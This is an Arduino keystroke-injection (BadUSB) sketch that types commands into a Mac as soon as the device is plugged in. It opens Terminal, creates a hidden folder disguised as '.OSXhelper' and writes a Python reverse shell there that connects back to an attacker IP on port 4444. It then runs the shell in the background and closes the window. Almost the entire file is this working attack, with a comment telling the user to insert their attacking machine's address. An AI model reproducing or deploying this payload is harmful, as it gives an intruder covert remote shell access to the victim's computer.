#include <Keyboard.h>

void setup() {
  Keyboard.begin();

  /* PAYLOAD START */
  delay(3000);

  // Open utilities folder and launch the terminal app
  Keyboard.press(KEY_LEFT_GUI);
  delay(1000);
  Keyboard.press(' ');
  Keyboard.releaseAll();
  delay(500);

  Keyboard.print("terminal");
  delay(1000);
  typeKey(KEY_RETURN);
  
  // Create hidden directory and navigate to it
  Keyboard.print("cd ~");
  typeKey(KEY_RETURN);
  Keyboard.print("mkdir .OSXhelper");
  typeKey(KEY_RETURN);
  Keyboard.print("cd .OSXhelper");
  typeKey(KEY_RETURN);

  // Write a Python reverse shell script
  // Replace IP Address with your attacking machine
  Keyboard.print("echo \"import socket,subprocess,os;\\ns=socket.socket(socket.AF_INET,socket.SOCK_STREAM);\\ns.connect(('172.20.10.2',4444));\\nos.dup2(s.fileno(),0);\\nos.dup2(s.fileno(),1);\\nos.dup2(s.fileno(),2);\\np=subprocess.call(['/bin/sh','-i']);\" > reverse_shell.py");
  typeKey(KEY_RETURN);

  // Adjust script permissions and execute the scripts
  Keyboard.print("chmod +x reverse_shell.py ");
  typeKey(KEY_RETURN);

  //Keyboard.print("python3 listen_on_4444.py &");
  //typeKey(KEY_RETURN);

  Keyboard.print("python3 reverse_shell.py &");
  typeKey(KEY_RETURN);
  
  // Close the terminal window
  delay(500);
  Keyboard.print("exit");
  typeKey(KEY_RETURN);

  Keyboard.end();
}

void loop() {}

void typeKey(int key) {
  Keyboard.press(key);
  delay(500);
  Keyboard.release(key);
}
